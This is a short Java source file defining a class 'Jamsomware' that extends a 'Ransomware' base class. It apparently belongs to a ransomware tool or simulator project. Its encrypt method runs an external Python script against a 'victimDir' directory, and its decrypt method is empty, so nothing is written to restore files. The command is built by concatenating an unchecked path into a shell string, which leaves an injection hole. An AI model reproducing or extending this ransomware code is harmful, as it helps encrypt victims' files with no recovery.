package datos;

public class Jamsomware extends Ransomware {

    public Jamsomware(String name, String description) {
        super(name, description);
    }

    @Override
    public void encrypt(String victimDir) throws Exception {
        System.out.println(victimDir);
        Process p = Runtime.getRuntime().exec("python3 jamsomware.py --dir " + victimDir);
        p.waitFor();
    }

    @Override
    public void decrypt(String victimDir) throws Exception {
        
    }

}
